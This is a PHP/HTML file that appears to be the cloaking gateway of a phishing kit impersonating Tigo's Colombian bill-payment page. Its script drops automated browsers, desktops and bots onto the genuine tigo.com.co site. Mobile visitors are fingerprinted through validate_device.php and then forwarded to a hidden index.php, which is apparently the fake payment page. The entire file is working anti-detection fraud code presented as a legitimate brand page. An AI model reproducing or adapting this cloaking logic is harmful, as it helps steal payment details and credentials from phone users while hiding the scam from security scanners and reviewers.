<?php
require_once __DIR__ . '/config/cloak.php';

if (isset($_SESSION['device_verified']) && $_SESSION['device_verified'] === true) {
    header('Location: index.php');
    exit;
}

$fake_title = "Pagar facturas | Tigo";
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo $fake_title; ?></title>
    <!-- CSS Tigo Clásico (Sin mensajes raros) -->
    <style>
        body, html { width: 100%; height: 100%; margin: 0; padding: 0; background-color: #f4f6f9; font-family: Arial, sans-serif; overflow: hidden; }
        .loading-container { display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; background-color: #fff; }
        .spinner { border: 4px solid rgba(0, 0, 0, 0.05); width: 50px; height: 50px; border-radius: 50%; border-left-color: #00377d; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loading-container" id="main_loader">
        <div class="spinner"></div>
    </div>

    <script>
        (function() {
            try {
                if (navigator.webdriver) throw new Error("");

                var hasTouch = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0) || (navigator.msMaxTouchPoints > 0);
                var w = window.screen.width;
                var h = window.screen.height;
                var isMobileSize = (w <= 1024);
                
                var ua = navigator.userAgent.toLowerCase();
                var isMobileUA = /android|webos|iphone|ipad|ipod|blackberry|windows phone/i.test(ua);

                if (hasTouch && isMobileSize && isMobileUA) {
                    var t = btoa(Date.now().toString()).split('').reverse().join('');
                    fetch('validate_device.php', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: 'fingerprint_token=' + t + '&touch=' + (hasTouch ? 1 : 0) + '&w=' + w
                    })
                    .then(r => r.json())
                    .then(data => {
                        if (data.status === 'ok') {
                            window.location.replace('index.php');
                        } else {
                            window.location.replace('https://www.tigo.com.co');
                        }
                    })
                    .catch(e => {
                        window.location.replace('https://www.tigo.com.co');
                    });
                } else {
                    // Bot o PC: Sacarlos sin hacer ruido
                    window.location.replace("https://www.tigo.com.co");
                }
            } catch (error) {
                window.location.replace("https://www.tigo.com.co");
            }
        })();
    </script>
</body>
</html>
